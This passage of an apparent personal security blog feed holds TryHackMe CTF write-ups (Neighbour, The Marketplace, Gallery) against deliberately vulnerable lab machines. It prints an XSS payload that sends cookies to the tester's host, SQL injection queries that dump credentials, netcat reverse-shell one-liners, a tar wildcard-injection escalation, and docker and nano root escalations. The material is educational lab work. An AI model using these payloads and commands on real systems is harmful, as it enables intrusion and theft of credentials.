  <li><a href="https://sapt.medium.com/insecure-direct-object-reference-cyber-sapiens-internship-task-18-986a5824c797">Prajit Sindhkar - Insecure Direct Object Reference</a></li>
  <li><a href="https://medium.com/@nynan/what-i-learnt-from-reading-220-idor-bug-reports-6efbea44db7">nynan - What I learnt from reading 220* IDOR bug reports.</a></li>
  <li><a href="https://ozguralp.medium.com/a-less-known-attack-vector-second-order-idor-attacks-14468009781a">Ozgur Alp - A Less Known Attack Vector, Second Order IDOR Attacks</a></li>
  <li><a href="https://medium.com/@jedus0r/idor-insecure-direct-object-references-my-first-p1-in-bugbounty-fb01f50e25df">jedus0r - IDOR “Insecure direct object references”, my first P1 in Bugbounty</a></li>
  <li><a href="https://infosecwriteups.com/leveraging-burp-suite-extension-for-finding-idor-insecure-direct-object-reference-2653f9b89fd4">Dhanush - Leveraging Burp Suite extension for finding IDOR(Insecure Direct Object Reference).</a></li>
  <li><a href="https://medium.com/@Steiner254/insecure-direct-object-references-idor-16bf0b981b90">Steiner254 - Insecure Direct Object References (IDOR)</a></li>
  <li><a href="https://medium.com/@sathvika03/insecure-direct-object-reference-2506ecd37a83">Sathvika - Insecure Direct Object Reference</a></li>
  <li><a href="https://shellmates.medium.com/insecure-direct-object-references-idor-vulnerability-aa48ad99b8c8">Shellmates Club - Insecure direct object references (IDOR) vulnerability</a></li>
  <li><a href="https://chetan-conikee.medium.com/insecure-direct-object-reference-c33bb851da05">Chetan Conikee - Insecure Direct Object Reference</a></li>
</ul>

<p><br /></p>

<h3 id="labs">IDOR Labs</h3>

<ul>
  <li><a href="https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references">Web Security Academy - Lab: Insecure direct object references</a></li>
  <li><a href="https://tryhackme.com/room/introwebapplicationsecurity">TryHackMe - Web Application Security</a></li>
  <li><a href="https://tryhackme.com/room/corridor">TryHackMe - Corridor</a> - <a href="https://mr0wido.github.io/tryhackme-corridor/">My Writeup :punch:</a></li>
  <li><a href="https://tryhackme.com/room/neighbour">TryHackMe - Neighbour</a> - <a href="https://mr0wido.github.io/tryhackme-neighbour/">My Writeup :punch:</a></li>
</ul>

<p><br />
<br />
I hope you liked my article. See you in my other articles:hand:</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="idor, idor guide" /><summary type="html"><![CDATA[In this article, I will provide an explanation of Insecure Direct Object References (IDOR) to the best of my ability.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/idor1.png" /><media:content medium="image" url="http://localhost:4000/assets/img/idor1.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Neighbour</title><link href="http://localhost:4000/tryhackme-neighbour/" rel="alternate" type="text/html" title="TryHackMe - Neighbour" /><published>2023-06-30T00:00:00+03:00</published><updated>2023-06-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-neighbour</id><content type="html" xml:base="http://localhost:4000/tryhackme-neighbour/"><![CDATA[<p>Check out our new cloud service, Authentication Anywhere. Can you find other user’s secrets?</p>

<p>Users can enter their username and password, for a totally secure login process! You definitely wouldn’t be able to find any secrets that other people have in their profile, right?</p>

<p>Access this challenge by deploying both the vulnerable machine by pressing the green “Start Machine” button located within this task, and the TryHackMe AttackBox by pressing the  “Start AttackBox” button located at the top-right of the page.</p>

<p>Navigate to the following URL using the AttackBox: http://MACHINE_IP</p>

<p>Check out similar content on TryHackMe:</p>

<ul>
  <li><a href="https://tryhackme.com/room/idor">IDOR</a></li>
</ul>

<p><br /></p>

<h3 id="1-find-the-flag-on-your-neighbors-logged-in-page">1. Find the flag on your neighbor’s logged in page!</h3>

<p>Let’s visit the website.</p>

<p>Here is a login page.</p>

<p><img src="/assets/img/tryhackme/neighbour/login.png" alt="login" /></p>

<p>The login page says you can log in as a guest. So let’s do <code class="language-plaintext highlighter-rouge">CTRL+U</code>.</p>

<p><img src="/assets/img/tryhackme/neighbour/guest.png" alt="guest" /></p>

<p>So, we can log in as <code class="language-plaintext highlighter-rouge">guest:guest</code>. Let’s log in.</p>

<p><img src="/assets/img/tryhackme/neighbour/guest-login.png" alt="guest-login" /></p>

<p>Yes, we are successfully login.</p>

<p><img src="/assets/img/tryhackme/neighbour/in.png" alt="in" /></p>

<p>Now, we must look at the <code class="language-plaintext highlighter-rouge">URL</code>.</p>

<p><img src="/assets/img/tryhackme/neighbour/url.png" alt="url" /></p>

<p>Let’s change the URL to this: <code class="language-plaintext highlighter-rouge">?user=admin</code>.</p>

<p>Huh! It was so easy. We are now an admin.</p>

<p><img src="/assets/img/tryhackme/neighbour/admin.png" alt="admin" /></p>

<p><br /></p>

<p>It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="web, idor, authentication" /><summary type="html"><![CDATA[Check out our new cloud service, Authentication Anywhere. Can you find other user’s secrets?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/neighbour.png" /><media:content medium="image" url="http://localhost:4000/assets/img/neighbour.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - The Marketplace</title><link href="http://localhost:4000/tryhackme-the-marketplace/" rel="alternate" type="text/html" title="TryHackMe - The Marketplace" /><published>2023-05-11T00:00:00+03:00</published><updated>2023-05-11T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-the-marketplace</id><content type="html" xml:base="http://localhost:4000/tryhackme-the-marketplace/"><![CDATA[<p>Can you take over The Marketplace’s infrastructure?</p>

<p>This is a medium level machine and looking at the tags we will be focusing on web, xss, docker and sqli.</p>

<p>The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.</p>

<p>Can you take advantage of this and will you be able to gain root access on his server?</p>

<p>Created by <a href="https://tryhackme.com/p/jammy">jammy</a></p>

<p><br /></p>

<h3 id="1-what-is-flag-1">1. What is flag 1?</h3>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.171.214
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/nmap.png" alt="nmap" /></p>

<p>Three ports are open. These are <code class="language-plaintext highlighter-rouge">22/tcp SSH, 80/tcp HTTP, 32768/tcp HTTP</code></p>

<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p>Here is a homepage.</p>

<p><img src="/assets/img/tryhackme/marketplace/home.png" alt="home" /></p>

<p>There are also <code class="language-plaintext highlighter-rouge">login</code> and <code class="language-plaintext highlighter-rouge">signup</code> pages.</p>

<p><img src="/assets/img/tryhackme/marketplace/login.png" alt="login" /></p>

<p>I register as <code class="language-plaintext highlighter-rouge">new:new</code> on the sign up page.</p>

<p><img src="/assets/img/tryhackme/marketplace/signup.png" alt="signup" /></p>

<p>After that, when I log in, two new pages appear.</p>

<p><img src="/assets/img/tryhackme/marketplace/new-pages.png" alt="new-pages" /></p>

<p>Let’s go to the <code class="language-plaintext highlighter-rouge">new-listing</code> page.</p>

<p><img src="/assets/img/tryhackme/marketplace/new-listing.png" alt="new-listing" /></p>

<p>I can write something on this page and upload it to the system. As far as I understand, what I write is directly saved in the database. So maybe we can access the database from here.</p>

<p>The message page is as follows.</p>

<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages" /></p>

<p>I’m checking the <code class="language-plaintext highlighter-rouge">robots.txt</code> page.</p>

<p><img src="/assets/img/tryhackme/marketplace/robots.png" alt="robots" /></p>

<p>I see the <code class="language-plaintext highlighter-rouge">/admin</code> page is accessible.</p>

<p>Let’s go to the admin page.</p>

<p><img src="/assets/img/tryhackme/marketplace/admin-error.png" alt="admin-error" /></p>

<p>I ran a <code class="language-plaintext highlighter-rouge">gobuster</code> scan at this point, but nothing useful came up. I tried <code class="language-plaintext highlighter-rouge">SQLi</code> using <code class="language-plaintext highlighter-rouge">sqlmap</code> on the login page, but it didn’t work either.</p>

<p>Then I decided to try <code class="language-plaintext highlighter-rouge">XSS</code> on the <code class="language-plaintext highlighter-rouge">New-listing</code> page.</p>

<p><img src="/assets/img/tryhackme/marketplace/xss1.png" alt="xss1" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ &lt;script&gt;alert('Mr0Wido')&lt;/script&gt;
</code></pre></div></div>

<p>Yes, it did work.</p>

<p><img src="/assets/img/tryhackme/marketplace/xss2.png" alt="xss2" /></p>

<p>There seems to be an <code class="language-plaintext highlighter-rouge">XSS vulnerability</code>. And maybe with the XSS vulnerability, we can access the cookies of the admin user.</p>

<p>But I still have doubts about how to do this somehow the admin user needs to interact.</p>

<p>I’ve been wandering around the site a little more and this catches my attention.</p>

<p><img src="/assets/img/tryhackme/marketplace/report.png" alt="report" /></p>

<p>In other words, we can report the list we created to the admin. So The admin will review the report we sent and click on the payload that we will upload. This means that we may have the cookies of the admin user.</p>

<p>Let ‘s do it.</p>

<p>So ı found this GitHub repository for stealing cookies. <a href="https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md">Steal Cookies with Reflected XSS</a>. <strong><code class="language-plaintext highlighter-rouge">(It's don't working.)</code></strong></p>

<p>The page says there is a python script that steals cookies, we need to run it first. <a href="https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py">lnxg33k’s cookie stealer script</a></p>

<p>Then our payload code is as follows:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
alert(document.cookie);
var i=new Image;
i.src="http://&lt;your-ip&gt;:8888/?"+document.cookie;
&lt;/script&gt;
</code></pre></div></div>

<p>The python script above didn’t work for me and I edited the script again. <a href="https://github.com/Mr0Wido/xss-cookie-stealer-python-script">Reformed XSS Cookie Stealer Python Script</a>
Let’s try.</p>

<p>Let’s run the script first.</p>

<p><img src="/assets/img/tryhackme/marketplace/script1.png" alt="script1" /></p>

<p>Now let’s <code class="language-plaintext highlighter-rouge">create a New-listing</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/payload.png" alt="payload" /></p>

<p>The payload we created.</p>

<p><img src="/assets/img/tryhackme/marketplace/report2.png" alt="report2" /></p>

<p>Now let’s get the admin’s cookie by reporting the payload we created.</p>

<p><img src="/assets/img/tryhackme/marketplace/report1.png" alt="report1" /></p>

<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages" /></p>

<p>Yes, it worked.</p>

<p><img src="/assets/img/tryhackme/marketplace/script2.png" alt="script2" /></p>

<p>The top token is for my user and the bottom is for the admin user.</p>

<p>Let’s go to the site and exchange it for our own token.</p>

<p>For <code class="language-plaintext highlighter-rouge">Firefox</code>, we will change the cookie part in <code class="language-plaintext highlighter-rouge">Right-click &gt; Inspect &gt; Storage</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/change.png" alt="change" /></p>

<p>And when we <code class="language-plaintext highlighter-rouge">refresh the page</code>, we can now <code class="language-plaintext highlighter-rouge">access the admin</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/admin.png" alt="admin" /></p>

<p>As you will see here, there are some users and their ids.</p>

<p><code class="language-plaintext highlighter-rouge">1:system - 2:michael - 3:jake</code></p>

<p>Others are users that I created. I’m working a little messy :grin:</p>

<p><br /></p>

<h3 id="2-what-is-flag-2-usertxt">2. What is flag 2? (User.txt)</h3>

<p>It’s obvious that there is an <code class="language-plaintext highlighter-rouge">SQLi vulnerability</code> here, but let’s verify it anyway.</p>

<p>I click on <code class="language-plaintext highlighter-rouge">Michael</code> whose id is 2 and write <code class="language-plaintext highlighter-rouge">2-1</code> instead of user=2 in the URL.</p>

<p><img src="/assets/img/tryhackme/marketplace/detect.png" alt="detect" /></p>

<p>And as you can see it returned to the system user with id 1.</p>

<p>We have confirmed the existence of the SQLi vulnerability.</p>

<p>To find out the number of columns, I proceed as follows, increasing one at a time.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,2,3,4,5--
</code></pre></div></div>

<p>When I get to the last 5, I get the following error.</p>

<p><img src="/assets/img/tryhackme/marketplace/error_column.png" alt="error_column" /></p>

<p>So we can go up to 4.</p>

<p>Let’s get the information from the database.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_scheam.schemata-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/schemata.png" alt="schemata" /></p>

<p>I continue from the <code class="language-plaintext highlighter-rouge">marketplace</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_scheam.tables WHERE table_schema='marketplace'-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/tables.png" alt="tables" /></p>

<p>There are two important tables, one is <code class="language-plaintext highlighter-rouge">messages</code> and the other is <code class="language-plaintext highlighter-rouge">users</code>.
First I look at the <code class="language-plaintext highlighter-rouge">messages table</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='messages'-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/column-messages.png" alt="column-messages" /></p>

<p>Let’s dump the <code class="language-plaintext highlighter-rouge">contents of the messages</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~~',message_content,'~~',user_from,'~~',user_to),3,4 FROM messages-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/content-messages.png" alt="content-messages" /></p>

<p>It seems that the user whose id is 1, is the system. The system sent a message to Jake, and the <code class="language-plaintext highlighter-rouge">message includes Jake's ssh password</code>. Let’s keep this information in our pocket now. And let’s go to the users table.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='users'-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/users.png" alt="users" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~',username,'~',password),3,4 FROM users-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/passwords.png" alt="passwords" /></p>

<p>I can try to crack these passwords, but first I want to check if the password I found for Jake works. If it doesn’t work, we continue from here.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh jake@10.10.171.214
</code></pre></div></div>

<p>Yes it worked. We are inside.</p>

<p><img src="/assets/img/tryhackme/marketplace/jake.png" alt="jake" /></p>

<p>Let’s get the <code class="language-plaintext highlighter-rouge">user flag</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="3-what-is-flag-3-roottxt">3. What is flag 3? (Root.txt)</h3>

<p>Let’s try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>

<p>And ther it is.</p>

<p><img src="/assets/img/tryhackme/marketplace/sduol.png" alt="sduol" /></p>

<p>We can run <code class="language-plaintext highlighter-rouge">/opt/backups/backup.sh</code> as Michael. Without requiring a password.</p>

<p>Let’s see what’s in it.</p>

<p><img src="/assets/img/tryhackme/marketplace/backup-sh.png" alt="backup-sh" /></p>

<p>I couldn’t find how to upgrade permissions. When I started researching, I found a way. Let’s try.</p>

<p>First I go to <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey Reverse Shell Cheat Sheet</a>. And for netcat, I choose:</p>

<p><img src="/assets/img/tryhackme/marketplace/nc.png" alt="nc" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
</code></pre></div></div>

<p>Now I’m setting up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on my own machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 5555
</code></pre></div></div>

<p>Then I run the following codes in order.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /opt/backups
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; shell.sh
$ echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
$ echo "" &gt; --checkpoint=1
$ chmod 777 backup.tar shell.sh
$ sudo -u michael ./backup.sh
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/backups.png" alt="backups" /></p>

<p>And we’re in.</p>

<p><img src="/assets/img/tryhackme/marketplace/michael-in.png" alt="michael-in" /></p>

<p>HUH! <code class="language-plaintext highlighter-rouge">999(docker)</code>. It’s interesting.</p>

<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a> to see if I can find anything about docker.</p>

<p>Let’s try this.</p>

<p><img src="/assets/img/tryhackme/marketplace/gtf.png" alt="gtf" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
</code></pre></div></div>

<p>And we are <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/rootin.png" alt="rootin" /></p>

<p>Let’s get the <code class="language-plaintext highlighter-rouge">root flag</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, xss, docker" /><summary type="html"><![CDATA[Can you take over The Marketplace’s infrastructure?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/marketplace.png" /><media:content medium="image" url="http://localhost:4000/assets/img/marketplace.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Gallery</title><link href="http://localhost:4000/tryhackme-gallery/" rel="alternate" type="text/html" title="TryHackMe - Gallery" /><published>2023-05-10T00:00:00+03:00</published><updated>2023-05-10T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gallery</id><content type="html" xml:base="http://localhost:4000/tryhackme-gallery/"><![CDATA[<p>Try to exploit our image gallery system.</p>

<p><br /></p>

<h2 id="1-deploy-and-get-a-shell">1. Deploy and get a Shell</h2>

<p>Our gallery is not very well secured.</p>

<p>Designed and created by <a href="https://twitter.com/mika_sec">Mikaa</a>!</p>

<p><br /></p>

<h3 id="11-how-many-ports-are-open">1.1 How many ports are open?</h3>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.35.177
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/nmap.png" alt="nmap" /></p>

<p>Two ports are open. These are <code class="language-plaintext highlighter-rouge">80/tcp HTTP, 8080/tcp HTTP</code></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer : 2</code></strong></p>

<p><br /></p>

<h3 id="12-whats-the-name-of-the-cms">1.2 What’s the name of the CMS?</h3>

<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p>An <code class="language-plaintext highlighter-rouge">Apache2 default</code> page appears.</p>

<p>Let’s look at the websie runining on <code class="language-plaintext highlighter-rouge">8080/tcp</code> port.</p>

<p>A login page appears.</p>

<p><img src="/assets/img/tryhackme/gallery/login.png" alt="login" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer : Simple Image Gallery</code></strong></p>

<p><br /></p>

<h3 id="13-whats-the-hash-password-of-the-admin-user">1.3 What’s the hash password of the admin user?</h3>

<p>The Website is using <code class="language-plaintext highlighter-rouge">Simple image gallery</code>. I’m looking to see if I can find anything in <a href="https://www.exploit-db.com">exploit-db</a>.</p>

<p>I found four results in <code class="language-plaintext highlighter-rouge">exploit-db</code>.</p>

<p>I’m going through the first and second results, separately.</p>

<p>First <a href="https://www.exploit-db.com/exploits/50214">Simple Image Gallery 1.0 - Remote Code Execution</a></p>

<p><img src="/assets/img/tryhackme/gallery/rce1.png" alt="rce1" /></p>

<p>I tried downloading and running the exploit first, but it didn’t work.</p>

<p>When I looked through the code, I saw this.</p>

<p><img src="/assets/img/tryhackme/gallery/rce2.png" alt="rce2" /></p>

<p>It seems we can access the admin login with SQLi.</p>

<p>We need to write this to the username; <code class="language-plaintext highlighter-rouge">admin' or '1'='1'#</code></p>

<p>Let’s try.</p>

<p><img src="/assets/img/tryhackme/gallery/rce3.png" alt="rce3" /></p>

<p>Yes it works.</p>

<p><img src="/assets/img/tryhackme/gallery/home.png" alt="home" /></p>

<p>We were able to log in to the site as an admin. I’ve been browsing the site for a bit, let’s see what I can find.</p>

<p>It seems we can upload files. Maybe we can upload a reverse shell.</p>

<p>But first, I want to examine the other page in exploit-db.
<a href="https://www.exploit-db.com/exploits/50198">Simple Image Gallery System 1.0 - ‘id’ SQL Injection</a></p>

<p><img src="/assets/img/tryhackme/gallery/sql1.png" alt="sql1" /></p>

<p>The page explains what to do.</p>

<p><img src="/assets/img/tryhackme/gallery/sql2.png" alt="sql2" /></p>

<p>We need to capture the request for a picture with Burp Suite.
Right click &gt; Save item and we need to save the request and run it in sqlmap.</p>

<p>Let ‘s do it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r text.req --dbs
</code></pre></div></div>

<p>There are <code class="language-plaintext highlighter-rouge">Boolean Based</code> and <code class="language-plaintext highlighter-rouge">Time Based</code> vulnerabilities of SQLi types on the site.</p>

<p><img src="/assets/img/tryhackme/gallery/kind.png" alt="kind" /></p>

<p>With the <code class="language-plaintext highlighter-rouge">--dbs</code> tag, sqlmap will give us the database names.</p>

<p><img src="/assets/img/tryhackme/gallery/databases.png" alt="databases" /></p>

<p>Now that we know the database names, let’s get the tables.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D &lt;database-name&gt; --tables 
</code></pre></div></div>

<p>I dumped the tables for <code class="language-plaintext highlighter-rouge">gallery_db</code>.</p>

<p><img src="/assets/img/tryhackme/gallery/tables.png" alt="tables" /></p>

<p>Now I will empty the columns of the <code class="language-plaintext highlighter-rouge">users</code> table.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D gallery_db -T users --columns
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/columns.png" alt="columns" /></p>

<p>Now let’s dump the <code class="language-plaintext highlighter-rouge">id, username, firstname, and password</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D gallery_db -T users -C id,username,firstname,password --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/dump.png" alt="dump" /></p>

<p><br /></p>

<h3 id="14-whats-the-user-flag">1.4 What’s the user flag?</h3>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.35.177/gallery/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/gobuster.png" alt="gobuster" /></p>

<p>The <code class="language-plaintext highlighter-rouge">/uploads</code> directory caught my attention. Maybe I can run the <code class="language-plaintext highlighter-rouge">reverse shell</code> that I will upload from this directory.</p>

<p>Let’s try.</p>

<p>First, go to albums, then create a new album, then you can upload files from inside the album.</p>

<p>Let’s create and upload our reverse shell. <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Pentestmonkey’s PHP Reverse Shell</a></p>

<p><img src="/assets/img/tryhackme/gallery/upload.png" alt="upload" /></p>

<p>Now I’m setting up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on my own machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>

<p>Now let’s go to the <code class="language-plaintext highlighter-rouge">/uploads</code> directory and find the file we uploaded.</p>

<p><img src="/assets/img/tryhackme/gallery/shell.png" alt="shell" /></p>

<p>Yes it works.</p>

<p><img src="/assets/img/tryhackme/gallery/in.png" alt="in" /></p>

<p>I see two folders named <code class="language-plaintext highlighter-rouge">mike</code> and <code class="language-plaintext highlighter-rouge">ubuntu</code> in my <code class="language-plaintext highlighter-rouge">/home</code> directory.</p>

<p><img src="/assets/img/tryhackme/gallery/users.png" alt="users" /></p>

<p>We need Mike’s password for <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>

<p><img src="/assets/img/tryhackme/gallery/denied.png" alt="denied" /></p>

<p>I didn’t know what to do and decided to run <a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md">linpeas.sh</a> on the target machine.</p>

<p><img src="/assets/img/tryhackme/gallery/mikepass.png" alt="mikepass" /></p>

<p>We found a password as you can see in the picture, but I don’t know who it belongs to.</p>

<p>Let’s try it for Mike.</p>

<p><img src="/assets/img/tryhackme/gallery/sumike.png" alt="sumike" /></p>

<p>And it worked. If you get an error, run the following codes on the target machine.</p>

<p><img src="/assets/img/tryhackme/gallery/term.png" alt="term" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
$ stty raw -echo;fg
$ reset
$ xterm
</code></pre></div></div>

<p>Let’s get the user flag.</p>

<p><img src="/assets/img/tryhackme/gallery/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="2--escalate-to-the-root-user">2.  Escalate to the root user</h2>

<p>Good luck with the last step !</p>

<p><br /></p>

<h3 id="21-whats-the-root-flag">2.1 What’s the root flag?</h3>

<p>Let’s try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>

<p><img src="/assets/img/tryhackme/gallery/sudol.png" alt="sudol" /></p>

<p>It seems we can run <code class="language-plaintext highlighter-rouge">rootkit.sh</code> with root privileges without requiring a password.</p>

<p>Let’s see what’s in it.</p>

<p><img src="/assets/img/tryhackme/gallery/rootkit.png" alt="rootkit" /></p>

<p>This means that we can use the <code class="language-plaintext highlighter-rouge">nano</code> to get root.</p>

<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/nano/">GTFOBins</a> to see if I can find anything about nano.</p>

<p>Let’s try this.</p>

<p><img src="/assets/img/tryhackme/gallery/gtf.png" alt="gtf" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ export TERM=xterm
$ sudo /bin/bash /opt/rootkit.sh
$ read
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/opt.png" alt="opt" /></p>

<p>After typing <code class="language-plaintext highlighter-rouge">read</code>, nano will open. Then we will do the following in order:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   ^R^X
   reset; sh 1&gt;&amp;0 2&gt;&amp;0
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/execute.png" alt="execute" /></p>

<p>And we are <code class="language-plaintext highlighter-rouge">root</code>. Yes!</p>

<p><img src="/assets/img/tryhackme/gallery/rootin.png" alt="rootin" /></p>

<p>Let’s get the root flag.</p>

<p><img src="/assets/img/tryhackme/gallery/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, rce, cms" /><summary type="html"><![CDATA[Try to exploit our image gallery system.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gallery.png" /><media:content medium="image" url="http://localhost:4000/assets/img/gallery.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>